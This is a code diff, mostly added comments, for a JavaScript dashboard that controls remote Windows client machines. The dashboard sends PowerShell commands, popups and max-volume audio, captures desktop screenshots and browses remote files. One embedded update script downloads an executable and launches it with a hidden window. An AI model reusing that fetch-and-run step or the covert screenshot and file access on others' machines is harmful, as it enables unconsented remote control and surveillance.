@@ -1,7 +1,23 @@
+/**
+ * RunApp - Windows Central Dashboard & Multi-Node Controller
+ *
+ * Core controller for managing connected client nodes, dispatching real-time PowerShell commands,
+ * interactive dialogs (speech synthesis, message popups, full-screen image viewer, audio blaster),
+ * full remote filesystem exploration (FTP browser), live desktop screenshot capture, and
+ * real-time audit logs of administrative actions.
+ */
 const RunApp = (() => {
+    'use strict';
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 1: APPLICATION STATE, CONFIGURATION & CONSTANTS
+    // ═══════════════════════════════════════════════════════════════════════════
+
     const VPS_URL = 'http://runx.ddns.net';
 
-    // ── Application State ──
+    /**
+     * Primary application reactive state container.
+     */
     const runState = {
         rows: [],
         sortedRows: [],
@@ -25,11 +41,25 @@ const RunApp = (() => {
         theme: 'night'
     };
 
+    /**
+     * Preset rotating example messages for Speak and Message modal modes.
+     */
     const popupExamples = {
-        speak: ['Audio test, all systems ready.', 'Status update: task completed.', 'Heads up, check your dashboard.'],
-        popup_msg: ['Reminder: save your work now.', 'Notice: update available.', 'Quick check: please confirm.']
+        speak: [
+            'Audio test, all systems ready.',
+            'Status update: task completed.',
+            'Heads up, check your dashboard.'
+        ],
+        popup_msg: [
+            'Reminder: save your work now.',
+            'Notice: update available.',
+            'Quick check: please confirm.'
+        ]
     };
 
+    /**
+     * Static demo records displayed prior to connecting to a live server.
+     */
     const demoUsers = [
         { username: 'a-00000000-W', updated_at: new Date(Date.now() - 4000).toISOString(), visible: true, demo: true },
         { username: 'b-00000000-W', updated_at: new Date(Date.now() - 17000).toISOString(), visible: false, demo: true },
@@ -37,10 +67,15 @@ const RunApp = (() => {
         { username: 'd-00000000-L', updated_at: new Date(Date.now() - 90000).toISOString(), visible: true, demo: true }
     ];
 
+    /**
+     * Fast element query selector by ID.
+     * @param {string} id - HTML element ID.
+     * @returns {HTMLElement|null} Found element or null.
+     */
     const $ = id => document.getElementById(id);
+
     const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];
     const STATUS_ORDER = { green: 0, yellow: 1, red: 2 };
-
     const WIN_LOGO_HTML = `<i class="bi bi-windows os-logo" aria-hidden="true"></i>`;
 
     const ACTION_MODE_LABELS = {
@@ -56,7 +91,16 @@ const RunApp = (() => {
     let dashboardSocket = null;
     let isSendingCommand = false;
 
-    // ── Platform & Username Parsing Helpers ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 2: PLATFORM & USERNAME PARSING HELPERS
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Parse structured client username into baseName, 8-character ID, and OS tag.
+     *
+     * @param {string} username - Composite username string (e.g. 'alice-4a7b9c1d-W').
+     * @returns {{baseName: string, id: string, os: string}} Parsed username tokens.
+     */
     function parseModernUsername(username) {
         if (window.RunUtils?.parseUsername) {
             return window.RunUtils.parseUsername(username);
@@ -67,11 +111,22 @@ const RunApp = (() => {
         return { baseName: match[1], id: match[2], os: match[3].toUpperCase() };
     }
 
-
+    /**
+     * Retrieve disambiguated display name for a given user from precomputed map.
+     *
+     * @param {string} username - Unique composite username.
+     * @returns {string} Human-friendly display name.
+     */
     function getDisplayUsername(username) {
         return runState.displayNameMap?.get(username) || parseModernUsername(username).baseName;
     }
 
+    /**
+     * Construct a mapping of usernames to display labels, appending short ID only if name collision occurs.
+     *
+     * @param {Array<{username: string}>} rows - Array of user records.
+     * @returns {Map<string, string>} Map linking username to display label.
+     */
     function buildDisplayUsernameMap(rows) {
         const counts = new Map();
         rows.forEach(user => {
@@ -85,8 +140,14 @@ const RunApp = (() => {
         }));
     }
 
+    /**
+     * Parse server-generated UTC ISO or standard SQL datetime string into a JavaScript Date.
+     *
+     * @param {string} value - Datetime string.
+     * @returns {Date} Parsed Date object.
+     */
     function parseServerTime(value) {
-        if (!value) return NaN;
+        if (!value) return new Date(NaN);
         const text = String(value).trim();
         if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(text)) {
             return new Date(text.replace(' ', 'T') + 'Z');
@@ -94,6 +155,13 @@ const RunApp = (() => {
         return new Date(text);
     }
 
+    /**
+     * Determine client connectivity health status: 'green' (online), 'yellow' (stale), or 'red' (offline).
+     *
+     * @param {object} user - User record object.
+     * @param {number} [nowMs=Date.now()] - Current epoch timestamp in milliseconds.
+     * @returns {'green'|'yellow'|'red'} Status indicator string.
+     */
     function getStatus(user, nowMs = Date.now()) {
         if (user.demo && user.username === 'a-00000000-W') return 'green';
         if (user.demo) {
@@ -107,16 +175,33 @@ const RunApp = (() => {
         return diff < 10 ? 'green' : diff < 30 ? 'yellow' : 'red';
     }
 
+    /**
+     * Sort user rows prioritizing online status ('green' -> 'yellow' -> 'red'), then alphabetically by username.
+     *
+     * @param {object[]} rows - Array of user records to sort.
+     * @returns {object[]} Sorted copy of user records.
+     */
     function sortRows(rows) {
         return [...rows].sort((a, b) =>
             STATUS_ORDER[getStatus(a)] - STATUS_ORDER[getStatus(b)] || a.username.localeCompare(b.username)
         );
     }
 
+    /**
+     * Retrieve renderable user list: returns real server rows when connected, or mock demo list otherwise.
+     *
+     * @returns {object[]} Array of rows ready for grid rendering.
+     */
     function getRenderableRows() {
         return runState.isConnected ? runState.sortedRows : sortRows(demoUsers);
     }
 
+    /**
+     * Determine which client card should receive single-letter hotkey hints ('C', 'V', etc.).
+     *
+     * @param {object[]} [sorted=getRenderableRows()] - Active sorted rows list.
+     * @returns {string|null} Target username for hotkey hint, or null.
+     */
     function getHintUsername(sorted = getRenderableRows()) {
         if (!sorted.length) return null;
         if (runState.activeUsername && sorted.some(u => u.username === runState.activeUsername)) {
@@ -125,6 +210,13 @@ const RunApp = (() => {
         return null;
     }
 
+    /**
+     * Generate compact diff signature string for user list to avoid redundant DOM reconciliation.
+     *
+     * @param {object[]} rows - Array of user objects.
+     * @param {boolean} [isSorted=false] - True if rows are pre-sorted.
+     * @returns {string} Hash signature string.
+     */
     function buildRowsRenderSignature(rows, isSorted = false) {
         const nowMs = Date.now();
         const source = isSorted ? rows : sortRows(rows);
@@ -138,12 +230,24 @@ const RunApp = (() => {
             .join('||');
     }
 
-    // ── Theme Management ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 3: DYNAMIC THEME ENGINE
+    // ═══════════════════════════════════════════════════════════════════════════
+
     const cap = s => s.charAt(0).toUpperCase() + s.slice(1);
+
+    /**
+     * Select a random theme name from available themes palette.
+     * @returns {string} Selected theme name.
+     */
     function pickRandomTheme() {
         return themeNames[Math.floor(Math.random() * themeNames.length)];
     }
 
+    /**
+     * Update label text for "Random" dropdown options to reflect currently resolved palette.
+     * @param {string} activeTheme - Name of currently applied active theme.
+     */
     function updateRandomThemeOptionLabel(activeTheme) {
         const label = `Random (${cap(activeTheme)})`;
         ['run-theme-random-option', 'sidebar-theme-random-option'].forEach(id => {
@@ -152,6 +256,11 @@ const RunApp = (() => {
         });
     }
 
+    /**
+     * Apply active theme palette across DOM root and persist selection in localStorage.
+     *
+     * @param {string} [themeName='night'] - Target theme name or 'random'.
+     */
     function applyTheme(themeName = 'night') {
         const usingRandom = themeName === 'random';
         const next = usingRandom ? pickRandomTheme() : (themeNames.includes(themeName) ? themeName : 'night');
@@ -175,7 +284,14 @@ const RunApp = (() => {
         });
     }
 
-    // ── Connection Handling ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 4: AUTHENTICATION & VPS CONNECTION MANAGEMENT
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Store dashboard password in session memory and sessionStorage.
+     * @param {string} password - Dashboard password string.
+     */
     function storePassword(password) {
         runState.password = password || '';
         if (runState.password) {
@@ -185,6 +301,10 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Update UI connect/disconnect button labels and styling based on connection state.
+     * @param {boolean} connected - Connection status flag.
+     */
     function setConnectionState(connected) {
         runState.isConnected = !!connected;
         const label = connected ? 'disconnect' : 'connect';
@@ -196,6 +316,9 @@ const RunApp = (() => {
         });
     }
 
+    /**
+     * Disconnect from server, purge stored credentials, and reset grid to demo mode.
+     */
     function disconnectAndReset() {
         storePassword('');
         setConnectionState(false);
@@ -208,6 +331,12 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Verify credentials against backend API by issuing an authenticated GET /api/clients request.
+     *
+     * @param {string} password - Dashboard password to validate.
+     * @returns {Promise<boolean>} True if server returned HTTP 200, False otherwise.
+     */
     async function validateVpsConnection(password) {
         if (!password) return false;
         const controller = new AbortController();
@@ -225,6 +354,12 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Authenticate and connect with current stored password, initiating data polling on success.
+     *
+     * @param {{notifyOnFail?: boolean}} [options={}] - Options object.
+     * @returns {Promise<boolean>} True if connection succeeded.
+     */
     async function connectWithCredentials({ notifyOnFail = true } = {}) {
         const isValid = await validateVpsConnection(runState.password);
         if (!isValid) {
@@ -239,6 +374,10 @@ const RunApp = (() => {
         return true;
     }
 
+    /**
+     * Display browser prompt for dashboard password.
+     * @returns {boolean} True if password provided, False if cancelled.
+     */
     function promptAllCredentials() {
         const passwordInput = prompt('Dashboard password:');
         if (passwordInput === null || !passwordInput) return false;
@@ -246,12 +385,21 @@ const RunApp = (() => {
         return true;
     }
 
+    /**
+     * Prompt for credentials and establish connection.
+     */
     async function promptAndConnect() {
         if (!promptAllCredentials()) return;
         await connectWithCredentials({ notifyOnFail: true });
     }
 
-    // ── WebSocket Dashboard Integration ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 5: REAL-TIME WEBSOCKET SYNCHRONIZATION (Socket.IO)
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Initialize Socket.IO connection for administrative push events (client status, frames, logs).
+     */
     function initDashboardSocket() {
         if (typeof io === 'undefined') return;
         if (!dashboardSocket) {
@@ -282,13 +430,21 @@ const RunApp = (() => {
                 dashboardSocket.on('new_operation_log', data => {
                     handleRealtimeLog(data);
                 });
-            } catch {}
+            } catch (err) {
+                console.error('[Dashboard Socket Error]', err);
+            }
         } else if (dashboardSocket.connected && runState.password) {
             dashboardSocket.emit('register_dashboard', { password: runState.password });
         }
     }
 
-    // ── Rendering Grid & Cards ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 6: CLIENT GRID & CARD RENDERING ENGINE
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Trigger grid re-render if active keyboard hint target has changed.
+     */
     function refreshHintsIfNeeded() {
         if (runState.isRendering) return;
         const next = getHintUsername();
@@ -298,6 +454,16 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Generate HTML snippet for card header and action button elements.
+     *
+     * @param {object} user - Client record.
+     * @param {string} status - Health color code ('green'/'yellow'/'red').
+     * @param {boolean} alive - True if status is green.
+     * @param {string} tsText - Human-readable timestamp string.
+     * @param {boolean} showHint - True if card qualifies for hotkey badges.
+     * @returns {string} Generated HTML string.
+     */
     function getCardBodyHtml(user, status, alive, tsText, showHint) {
         const canInteract = runState.isConnected || !!user.demo;
         const showPrimary = showHint && alive && canInteract;
@@ -323,10 +489,23 @@ const RunApp = (() => {
             </div>`;
     }
 
+    /**
+     * Generate render cache signature for a single user card.
+     *
+     * @param {object} user - User record.
+     * @param {string} status - Status code.
+     * @param {boolean} alive - Is alive flag.
+     * @param {string} tsText - Timestamp string.
+     * @param {boolean} showHint - Show hint flag.
+     * @returns {string} Cache key string.
+     */
     function getCardRenderSignature(user, status, alive, tsText, showHint) {
         return `${user.username}|${getDisplayUsername(user.username)}|${user.version || ''}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
     }
 
+    /**
+     * Perform smart DOM diff and reconciliation of client cards on the grid.
+     */
     function renderGrid() {
         runState.isRendering = true;
         const grid = $('user-grid');
@@ -403,7 +582,14 @@ const RunApp = (() => {
         runState.isRendering = false;
     }
 
-    // ── Selection & Keyboard Navigation ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 7: SELECTION, KEYBOARD NAVIGATION & INTERACTIVE STATE
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Display or hide currently active client name badge in the top navigation bar.
+     * @param {string|null} username - Username identifier or null.
+     */
     function setRunClientName(username) {
         const el = $('runClientName');
         const wrap = $('runClientWrap');
@@ -417,6 +603,9 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Deselect any active user card and restore neutral hover state.
+     */
     function clearActiveSelection() {
         runState.activeUsername = null;
         runState.interactionMode = null;
@@ -426,6 +615,13 @@ const RunApp = (() => {
         refreshHintsIfNeeded();
     }
 
+    /**
+     * Set selected client card via mouse hover or keyboard arrow keys.
+     *
+     * @param {object|null} user - Target user object.
+     * @param {'hover'|'keyboard'} mode - Interaction mechanism.
+     * @param {{scroll?: boolean}} [options={}] - Optional scroll-into-view parameter.
+     */
     function setActiveSelection(user, mode, { scroll = false } = {}) {
         if (!user) {
             clearActiveSelection();
@@ -445,12 +641,24 @@ const RunApp = (() => {
         refreshHintsIfNeeded();
     }
 
-    // ── Popup Modal Helpers ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 8: ACTION MODAL (CMD, SPEAK, MESSAGE, SCRIPTS) CONTROLLER
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Randomly pick a sample prompt text for Speak or Message modes.
+     *
+     * @param {'speak'|'popup_msg'} mode - Action mode.
+     * @returns {string} Sample text phrase.
+     */
     function pickRandomPopupExample(mode) {
         const list = popupExamples[mode];
         return list?.length ? list[Math.floor(Math.random() * list.length)] : '';
     }
 
+    /**
+     * Update placeholder text in the action modal textarea based on selected mode.
+     */
     function updatePlaceholder() {
         const ta = $('popup-input');
         const m = runState.popupMode;
@@ -460,12 +668,19 @@ const RunApp = (() => {
         else if (m === 'popup_msg') ta.placeholder = `Type popup note i.e. "${runState.popupExampleText || 'Reminder: save your work now.'}"`;
     }
 
+    /**
+     * Get placeholder or sample text for Tab-key autofill feature.
+     * @returns {string} Text to insert on autofill.
+     */
     function getPopupAutofillText() {
         const m = runState.popupMode;
         if (m === 'cmd') return $('popup-input')?.placeholder || '';
         return runState.popupExampleText || pickRandomPopupExample(m) || $('popup-input')?.placeholder || '';
     }
 
+    /**
+     * Synchronize option button states (voice selection, visibility, volume slider) in modal.
+     */
     function updateOptionsUI() {
         const setActive = (id, cond) => {
             const el = $(id);
@@ -515,12 +730,17 @@ const RunApp = (() => {
         updatePlaceholder();
     }
 
-    // ── Popup Open / Close ──
+    /**
+     * Close the action mode selector dropdown menu.
+     */
     function closeActionModeDropdown() {
         $('action-mode-btn')?.classList.remove('open');
         $('actionModeMenu')?.classList.remove('open');
     }
 
+    /**
+     * Calculate and adjust action mode dropdown width to fit longest option.
+     */
     function sizeActionModeDropdown() {
         window.RunUtils?.sizeDropdownToContent(
             $('action-mode-btn'), $('actionModeMenu'), $('actionModeWrap'),
@@ -529,6 +749,11 @@ const RunApp = (() => {
         );
     }
 
+    /**
+     * Switch current action mode view (cmd, speak, popup_msg, imager, audio, scripts).
+     *
+     * @param {'cmd'|'speak'|'popup_msg'|'imager'|'audio'|'scripts'|'placeholder'} mode - Action mode.
+     */
     function applyActionMode(mode) {
         runState.popupMode = mode;
         runState.popupExampleText = (mode === 'speak' || mode === 'popup_msg') ? pickRandomPopupExample(mode) : '';
@@ -569,14 +794,11 @@ const RunApp = (() => {
 
         closeActionModeDropdown();
         updateOptionsUI();
+
         if (isImager) {
-            setTimeout(() => {
-                $('imager-caption-input')?.focus();
-            }, 50);
+            setTimeout(() => { $('imager-caption-input')?.focus(); }, 50);
         } else if (isAudio) {
-            setTimeout(() => {
-                $('audio-caption-input')?.focus();
-            }, 50);
+            setTimeout(() => { $('audio-caption-input')?.focus(); }, 50);
         } else if (!isScripts) {
             setTimeout(() => {
                 $('popup-input')?.focus();
@@ -585,11 +807,17 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Close target client switch dropdown menu.
+     */
     function closeTargetDropdown() {
         $('popup-target-label')?.classList.remove('open');
         $('actionTargetMenu')?.classList.remove('open');
     }
 
+    /**
+     * Populate target dropdown with available online client machines.
+     */
     function renderTargetDropdown() {
         const menu = $('actionTargetMenu');
         if (!menu) return;
@@ -620,6 +848,12 @@ const RunApp = (() => {
         });
     }
 
+    /**
+     * Open full-screen Action Modal for a given client user and mode.
+     *
+     * @param {'cmd'|'speak'|'popup_msg'|'imager'|'audio'|'scripts'} mode - Mode to open.
+     * @param {object} user - Target client object.
+     */
     function openPopup(mode, user) {
         runState.popupUser = user;
         runState.selectedVis = !!user.visible;
@@ -635,6 +869,9 @@ const RunApp = (() => {
         applyActionMode(mode);
     }
 
+    /**
+     * Close the action modal and return view to RUN grid.
+     */
     function closePopup() {
         resetImager();
         resetAudio();
@@ -648,7 +885,10 @@ const RunApp = (() => {
         document.body.classList.add('view-run');
     }
 
-    // ── Imager Mode State & File Handling ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 9: IMAGER MODAL SUBSYSTEM
+    // ═══════════════════════════════════════════════════════════════════════════
+
     const imagerState = {
         file: null,
         imageData: null,
@@ -657,6 +897,9 @@ const RunApp = (() => {
         dimensionsText: ''
     };
 
+    /**
+     * Reset Imager state and restore upload card to initial empty state.
+     */
     function resetImager() {
         imagerState.file = null;
         imagerState.imageData = null;
@@ -674,15 +917,19 @@ const RunApp = (() => {
 
         if (fileInput) fileInput.value = '';
         if (captionInput) captionInput.value = '';
-        if (card) {
-            card.classList.remove('has-file', 'dragover');
-        }
+        if (card) card.classList.remove('has-file', 'dragover');
         if (iconWrap) iconWrap.innerHTML = '<i class="bi bi-cloud-arrow-up"></i>';
         if (titleSpan) titleSpan.textContent = 'Upload Image';
         if (descSpan) descSpan.textContent = 'Click or drag & drop (PNG, JPG, GIF, WebP, or Ctrl+V)';
         if (removeBtn) removeBtn.style.display = 'none';
     }
 
+    /**
+     * Format byte count into human-readable data size string (B, KB, MB).
+     *
+     * @param {number} bytes - Number of bytes.
+     * @returns {string} Formatted size string.
+     */
     function formatBytes(bytes) {
         if (!bytes || bytes <= 0) return '0 B';
         if (bytes < 1024) return bytes + ' B';
@@ -690,6 +937,11 @@ const RunApp = (() => {
         return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
     }
 
+    /**
+     * Update visual card state in Imager section once an image has loaded.
+     *
+     * @param {boolean} isGif - True if animated GIF image.
+     */
     function updateImagerCardUI(isGif) {
         const card = $('imager-card');
         const iconWrap = $('imager-card-icon');
@@ -709,6 +961,11 @@ const RunApp = (() => {
         if (removeBtn) removeBtn.style.display = 'inline-flex';
     }
 
+    /**
+     * Ingest and downsample chosen image file, preserving animated GIFs.
+     *
+     * @param {File} file - Selected image file object.
+     */
     function processImagerFile(file) {
         if (!file || (!file.type.startsWith('image/') && !file.name.match(/\.(png|jpe?g|gif|webp|bmp)$/i))) {
             alert('Please select a valid image file (PNG, JPG, WebP, GIF, etc.).');
@@ -716,7 +973,6 @@ const RunApp = (() => {
         }
 
         const isGif = file.type === 'image/gif' || file.name.toLowerCase().endsWith('.gif');
-
         const reader = new FileReader();
         reader.onload = e => {
             const rawDataUrl = e.target.result;
@@ -787,7 +1043,10 @@ const RunApp = (() => {
         reader.readAsDataURL(file);
     }
 
-    // ── Audio Mode State & File Handling ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 10: AUDIO BLASTER SUBSYSTEM
+    // ═══════════════════════════════════════════════════════════════════════════
+
     const audioState = {
         file: null,
         audioData: null,
@@ -798,6 +1057,9 @@ const RunApp = (() => {
         isPlayingPreview: false
     };
 
+    /**
+     * Stop active audio preview playback in browser dashboard.
+     */
     function stopAudioPreview() {
         if (audioState.audioPreviewObj) {
             audioState.audioPreviewObj.pause();
@@ -811,6 +1073,9 @@ const RunApp = (() => {
         }
     }
 
+    /**
+     * Reset Audio Blaster state and restore audio upload card to default.
+     */
     function resetAudio() {
         stopAudioPreview();
         audioState.file = null;
@@ -830,9 +1095,7 @@ const RunApp = (() => {
 
         if (fileInput) fileInput.value = '';
         if (captionInput) captionInput.value = '';
-        if (card) {
-            card.classList.remove('has-file', 'dragover');
-        }
+        if (card) card.classList.remove('has-file', 'dragover');
         if (iconWrap) iconWrap.innerHTML = '<i class="bi bi-music-note-beamed"></i>';
         if (titleSpan) titleSpan.textContent = 'Upload MP3 Audio';
         if (descSpan) descSpan.textContent = 'Click or drag & drop MP3 file (blasts speaker at max volume)';
@@ -840,6 +1103,12 @@ const RunApp = (() => {
         if (removeBtn) removeBtn.style.display = 'none';
     }
 
+    /**
+     * Format raw seconds into m:ss format.
+     *
+     * @param {number} seconds - Track duration in seconds.
+     * @returns {string} Formatted duration string.
+     */
     function formatDuration(seconds) {
         if (!seconds || isNaN(seconds)) return '';
         const m = Math.floor(seconds / 60);
@@ -847,6 +1116,9 @@ const RunApp = (() => {
         return `${m}:${s < 10 ? '0' : ''}${s}`;
     }
 
+    /**
+     * Update visual card state in Audio section once a sound file has loaded.
+     */
     function updateAudioCardUI() {
         const card = $('audio-card');
         const iconWrap = $('audio-card-icon');
@@ -872,6 +1144,11 @@ const RunApp = (() => {
         if (removeBtn) removeBtn.style.display = 'inline-flex';
     }
 
+    /**
+     * Ingest audio file and extract track metadata.
+     *
+     * @param {File} file - Audio file object.
+     */
     function processAudioFile(file) {
         if (!file) return;
         const isAudio = file.type.startsWith('audio/') || file.name.match(/\.(mp3|wav|ogg|m4a|aac|wma)$/i);
@@ -881,7 +1158,6 @@ const RunApp = (() => {
         }
 
         stopAudioPreview();
-
         const reader = new FileReader();
         reader.onload = e => {
             const rawDataUrl = e.target.result;
@@ -901,12 +1177,14 @@ const RunApp = (() => {
                 }
             };
             tempAudio.src = rawDataUrl;
-
             updateAudioCardUI();
         };
         reader.readAsDataURL(file);
     }
 
+    /**
+     * Toggle browser playback preview for uploaded audio clip.
+     */
     function toggleAudioPreview() {
         if (!audioState.audioData) return;
         const previewBtn = $('audio-preview-btn');
@@ -933,7 +1211,16 @@ const RunApp = (() => {
         }
     }
 
-    // ── Command Building & Scripts ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 11: REMOTE SCRIPT DISPATCH & MANAGEMENT
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Escape strings safely for embedding inside PowerShell command lines.
+     *
+     * @param {string} str - Raw string.
+     * @returns {string} Escaped PowerShell expression string.
+     */
     function formatPSString(str) {
         return str.replace(/'/g, "''").split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
     }
@@ -950,6 +1237,9 @@ $o = "$p\\installer.exe"
 Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
 Start-Process -FilePath $o -WindowStyle Hidden`;
 
+    /**
+     * Dispatch auto-update script to remote client to download latest release binary.
+     */
     async function doSendUpdateClient() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
@@ -993,6 +1283,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Toggle continuous desktop screenshot streaming on or off for the client.
+     */
     async function doToggleEnableScreenshot() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
@@ -1031,6 +1324,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Delete all stored screenshot frames for the target user.
+     */
     async function doDeleteAllScreenshots() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
@@ -1069,10 +1365,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════
-    // SCREENSHOT CAPTURE (SINGLE-CLICK TAKE & REDIRECT)
-    // ═══════════════════════════════════════════════════════════════
-
+    /**
+     * Request an on-demand single screenshot from the client and switch to the Frames view.
+     */
     async function doTakeSingleScreenshot() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
@@ -1104,7 +1399,6 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         };
 
         if (!runState.isConnected || user.demo) {
-            // Demo mode simulation
             setTimeout(() => {
                 restoreBtn();
                 closePopup();
@@ -1135,7 +1429,6 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             const data = await res.json();
             restoreBtn();
 
-            // Redirect user to the frames page for this user and focused on this frame!
             closePopup();
             if (typeof window.__switchMode === 'function') {
                 window.__switchMode('frames');
@@ -1152,9 +1445,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════
-    // FTP FILE BROWSER MODULE
-    // ═══════════════════════════════════════════════════════════════
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 12: REMOTE FILE SYSTEM / FTP BROWSER SUBSYSTEM
+    // ═══════════════════════════════════════════════════════════════════════════
 
     const ftpState = {
         isOpen: false,
@@ -1170,6 +1463,14 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         previewData: null
     };
 
+    let ftpHistoryDepth = 0;
+
+    /**
+     * Format raw byte size for FTP explorer items.
+     *
+     * @param {number} bytes - Size in bytes.
+     * @returns {string} Formatted size string.
+     */
     function formatFileSize(bytes) {
         if (bytes === 0) return '0 B';
         if (!bytes || isNaN(bytes)) return '—';
@@ -1179,6 +1480,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         return parseFloat((bytes / Math.pow(k, i)).toFixed(i === 0 ? 0 : 1)) + ' ' + sizes[i];
     }
 
+    /**
+     * Format epoch seconds into standard YYYY-MM-DD HH:MM string.
+     *
+     * @param {number} timestamp - Unix timestamp in seconds.
+     * @returns {string} Formatted datetime string.
+     */
     function formatFileDate(timestamp) {
         if (!timestamp) return '—';
         try {
@@ -1190,6 +1497,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Derive appropriate Bootstrap icon and category CSS class based on file extension.
+     *
+     * @param {{is_dir: boolean, ext?: string}} item - File descriptor.
+     * @returns {{icon: string, typeClass: string}} Icon metadata.
+     */
     function getFileIconClass(item) {
         if (item.is_dir) return { icon: 'bi-folder-fill', typeClass: 'dir' };
         const ext = (item.ext || '').toLowerCase();
@@ -1211,6 +1524,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         return { icon: 'bi-file-earmark', typeClass: 'file' };
     }
 
+    /**
+     * Sanitize and escape HTML entities in untrusted text.
+     *
+     * @param {string} str - Raw input string.
+     * @returns {string} HTML-escaped string.
+     */
     function escapeHtml(str) {
         if (!str) return '';
         return String(str)
@@ -1221,8 +1540,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             .replace(/'/g, '&#39;');
     }
 
-    let ftpHistoryDepth = 0;
-
+    /**
+     * Launch the remote FTP browser modal for currently selected client.
+     */
     function openFtpBrowser() {
         const user = runState.popupUser;
         if (!user) return;
@@ -1251,6 +1571,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         loadFtpPath('drives', false);
     }
 
+    /**
+     * Close the FTP browser modal and synchronize browser history stack.
+     *
+     * @param {boolean} [fromUserAction=false] - True if triggered by explicit user close click.
+     */
     function closeFtpBrowser(fromUserAction = false) {
         if (!ftpState.isOpen) return;
         ftpState.isOpen = false;
@@ -1268,6 +1593,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Close the right-hand file preview/editor drawer in the FTP browser.
+     *
+     * @param {boolean} [fromUserAction=false] - True if user clicked close drawer.
+     */
     function closeFtpPreview(fromUserAction = false) {
         toggleFtpEditMode(false);
         ftpState.previewData = null;
@@ -1282,6 +1612,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Generate mock directory tree for offline demonstration sessions.
+     *
+     * @param {string} path - Target path.
+     * @returns {object} Mock directory payload.
+     */
     function getDemoFsData(path) {
         if (!path || path === 'drives' || path === 'Drives') {
             return {
@@ -1318,6 +1654,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         };
     }
 
+    /**
+     * Load and render directory contents or drive listing from remote client.
+     *
+     * @param {string} path - Remote path (e.g., 'C:\\Users' or 'drives').
+     * @param {boolean} [pushHistory=true] - True to push browser history state for back/forward navigation.
+     */
     async function loadFtpPath(path, pushHistory = true) {
         if (ftpState.isLoading) return;
         ftpState.isLoading = true;
@@ -1388,6 +1730,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         updateFtpStatusBar();
     }
 
+    /**
+     * Render friendly error message inside the FTP file view with return/retry actions.
+     *
+     * @param {string} errMsg - Error message text.
+     * @param {string} currentPath - Attempted path.
+     */
     function renderFtpError(errMsg, currentPath) {
         const listContainer = $('ftp-file-list');
         if (!listContainer) return;
@@ -1413,6 +1761,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         updateFtpStatusBar();
     }
 
+    /**
+     * Render the top drive chip buttons bar.
+     */
     function renderFtpDrivesBar() {
         const bar = $('ftp-drives-bar');
         if (!bar) return;
@@ -1436,13 +1787,15 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Render interactive clickable path breadcrumbs.
+     */
     function renderFtpBreadcrumbs() {
         const container = $('ftp-breadcrumbs');
         if (!container) return;
         container.innerHTML = '';
 
         const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
-
         const rootCrumb = document.createElement('span');
         rootCrumb.className = 'ftp-crumb-item' + (isDrives ? ' active' : '');
         rootCrumb.innerHTML = '<i class="bi bi-hdd-network"></i> Drives';
@@ -1484,6 +1837,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Enable or disable the "Up / Parent Directory" button.
+     */
     function updateFtpParentBtnState() {
         const btn = $('ftp-parent-btn');
         if (!btn) return;
